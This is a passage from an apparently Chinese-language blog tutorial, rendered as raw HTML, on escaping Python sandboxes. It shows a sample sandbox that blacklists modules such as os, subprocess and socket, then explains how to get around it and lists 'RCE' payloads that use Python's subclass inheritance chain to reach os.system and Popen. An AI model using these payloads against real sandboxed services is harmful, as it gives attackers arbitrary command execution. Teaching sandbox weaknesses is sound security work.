class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;_hook_import_&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;name, *args, **kwargs&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    module_blacklist = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;sys&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;time&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;bdb&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;bsddb&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;cgi&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;CGIHTTPServer&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;cgitb&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;compileall&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;ctypes&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;dircache&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;doctest&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;dumbdbm&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;filecmp&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;fileinput&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;ftplib&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;gzip&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;getopt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;getpass&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;gettext&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;httplib&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;importlib&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;imputil&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;linecache&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;macpath&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;mailbox&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;mailcap&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;mhlib&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;mimetools&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;mimetypes&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;modulefinder&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;multiprocessing&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;netrc&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;new&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;optparse&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pdb&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pipes&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pkgutil&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;platform&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;popen2&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;poplib&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;posix&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;posixfile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;profile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pstats&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pty&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;py_compile&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;pyclbr&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;pydoc&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rexec&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;runpy&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;shlex&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;shutil&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SimpleHTTPServer&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;SimpleXMLRPCServer&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;site&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;smtpd&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;socket&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SocketServer&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;subprocess&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;sysconfig&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;tabnanny&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;tarfile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;telnetlib&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;tempfile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;Tix&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;trace&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;turtle&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;urllib&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;urllib2&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;uu&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;webbrowser&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;whichdb&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;zipfile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;zipimport&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; forbid &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; module_blacklist:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; name == forbid:        &lt;span class=&#34;comment&#34;&gt;# don&amp;#x27;t let user import these modules&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; RuntimeError(&lt;span class=&#34;string&#34;&gt;&amp;#x27;No you can\&amp;#x27; import &amp;#123;0&amp;#125;!!!&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(forbid))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# normal modules can be imported&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(name, *args, **kwargs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sandbox_exec&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;command&lt;/span&gt;):      &lt;span class=&#34;comment&#34;&gt;# sandbox user input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __sandboxed_builtins__ = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(__builtins__.__dict__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __sandboxed_builtins__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;] = _hook_import_    &lt;span class=&#34;comment&#34;&gt;# hook import&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;del&lt;/span&gt; __sandboxed_builtins__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;open&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;: __sandboxed_builtins__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; command &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; _&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt;     &lt;span class=&#34;comment&#34;&gt;# do calculate in a sandboxed  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;沙箱首先获取  &lt;code&gt;__builtins__&lt;/code&gt; ，然后依据现有的  &lt;code&gt;__builtins__&lt;/code&gt;  来构建命名空间。&lt;/li&gt;
&lt;li&gt;修改  &lt;code&gt;__import__&lt;/code&gt;  函数为自定义的 &lt;code&gt;_hook_import_&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;删除 open 函数防止文件操作&lt;/li&gt;
&lt;li&gt;exec 命令。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;绕过方式：&lt;/p&gt;
&lt;p&gt;由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的  &lt;code&gt;__builtins__&lt;/code&gt; （这个 &lt;code&gt;__builtins__&lt;/code&gt; 保存的就是原始 &lt;code&gt;__builtins__&lt;/code&gt; 的引用），比如 types 库，来执行任意命令：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;types&amp;#x27;&lt;/span&gt;).__builtins__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;string&amp;#x27;&lt;/span&gt;).__builtins__&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;完全限制no-builtins&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完全限制no-builtins&#34;&gt;#&lt;/a&gt; 完全限制 (no builtins)&lt;/h4&gt;
&lt;p&gt;如果沙箱完全清空了  &lt;code&gt;__builtins__&lt;/code&gt; , 则无法使用 import, 如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;__import__&amp;quot;&lt;/span&gt;, &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;: &amp;#123;&amp;#125;&amp;#125;,&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;: &amp;#123;&amp;#125;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NameError: name &lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; defined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;__import__&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;import os&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;import os&amp;quot;&lt;/span&gt;,&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;: &amp;#123;&amp;#125;&amp;#125;,&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;: &amp;#123;&amp;#125;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ImportError: &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; found&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类，然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/2308?time__1311=n4%2BxnieDqWqYq7KYBKDsf3ObzDkQKQ11DBQoD&#34;&gt;用 python 继承链搞事情 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;具体原理可见：&lt;a class=&#34;link&#34; href=&#34;https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals&#34;&gt;Python 沙箱逃逸小结 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;常见的一些 payload 如下:&lt;/p&gt;
&lt;h5 id=&#34;rce-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce-2&#34;&gt;#&lt;/a&gt; RCE&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# os&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_wrap_close&amp;quot;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# subprocess &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;Popen&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# builtins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_GeneratorContextManagerBase&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span 